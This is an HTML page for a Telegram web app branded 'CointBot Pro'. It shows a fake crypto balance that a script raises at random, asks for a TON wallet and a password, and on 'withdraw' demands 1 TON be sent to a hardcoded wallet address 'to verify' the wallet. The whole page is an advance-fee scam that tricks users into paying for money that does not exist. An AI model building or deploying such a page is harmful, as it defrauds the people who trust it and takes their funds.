<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CointBot Pro | Terminal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: 'Inter', sans-serif; background: #000; color: white; margin: 0; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
        .balance-container { text-align: center; margin-bottom: 25px; }
        .label-top { color: #8a8a8e; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; }
        .balance-value { font-size: 50px; font-weight: 900; font-variant-numeric: tabular-nums; text-shadow: 0 0 25px rgba(64, 167, 227, 0.4); }
        .currency { color: #40a7e3; }
        .input-group { width: 85%; max-width: 320px; margin-bottom: 12px; }
        .input-label { font-size: 10px; color: #40a7e3; font-weight: bold; margin-bottom: 5px; text-transform: uppercase; }
        input { width: 100%; background: #111; border: 1px solid #222; border-radius: 14px; padding: 14px; color: white; box-sizing: border-box; outline: none; }
        .tasks-box { width: 85%; max-width: 320px; background: rgba(64, 167, 227, 0.05); border: 1px dashed #333; border-radius: 14px; padding: 15px; margin-bottom: 20px; }
        .task-btn { background: #40a7e3; color: white; border: none; padding: 6px 12px; border-radius: 8px; font-size: 11px; font-weight: bold; text-decoration: none; }
        .withdraw-btn { width: 85%; max-width: 320px; background: #fff; color: #000; border: none; padding: 18px; border-radius: 35px; font-size: 16px; font-weight: 800; cursor: pointer; }
        .status { margin-top: 15px; font-size: 10px; color: #4cd964; display: flex; align-items: center; gap: 6px; }
        .dot { width: 6px; height: 6px; background: #4cd964; border-radius: 50%; animation: pulse 1s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
    </style>
</head>
<body>

    <div class="balance-container">
        <div class="label-top">Available to Withdraw</div>
        <div class="balance-value"><span class="currency">$</span><span id="balance">0.00</span></div>
        <div class="status"><div class="dot"></div> CRYPTO-TERMINAL ACTIVE</div>
    </div>

    <div class="tasks-box">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <div style="font-size: 12px;"><b>Step 1:</b> Join Channel</div>
            <a href="https://t.me/hackpackposter" class="task-btn">JOIN</a>
        </div>
    </div>

    <div class="input-group">
        <div class="input-label">Your Wallet (TON)</div>
        <input type="text" id="wallet" placeholder="Enter your address...">
    </div>

    <div class="input-group">
        <div class="input-label">System Password</div>
        <input type="password" id="password" placeholder="••••••••">
    </div>

    <button class="withdraw-btn" onclick="processWithdraw()">WITHDRAW NOW</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        let balance = 0.00;
        let isDead = false;
        
        function mine() {
            if (isDead) return;
            balance += Math.random() * 0.15;
            document.getElementById('balance').innerText = balance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
        }
        setInterval(mine, 100);

        function processWithdraw() {
            const wallet = document.getElementById('wallet').value;
            const pass = document.getElementById('password').value;

            if (pass === "hackpack1977") {
                isDead = true; balance = 0; document.getElementById('balance').innerText = "0.00";
                tg.showAlert("🛑 Security Breach: Account Reset.");
                return;
            }

            if (!wallet) { tg.showAlert("⚠️ Enter wallet!"); return; }

            tg.showPopup({
                title: 'Payment Required',
                message: 'To verify your wallet, send 1 TON to:\n\nUQBAtQa96SBwjfTpuiDAphf065OvEr1W78JUrL1U8X3-J9Mw\n\nAfter payment, click "Check Payment".',
                buttons: [
                    {id: 'check', type: 'default', text: 'Check Payment'},
                    {id: 'cancel', type: 'destructive', text: 'Cancel'}
                ]
            }, function(id) {
                if (id === 'check') {
                    tg.sendData("CHECK_PAYMENT_REQUEST");
                    tg.close();
                }
            });
        }
    </script>
</body>
</html>
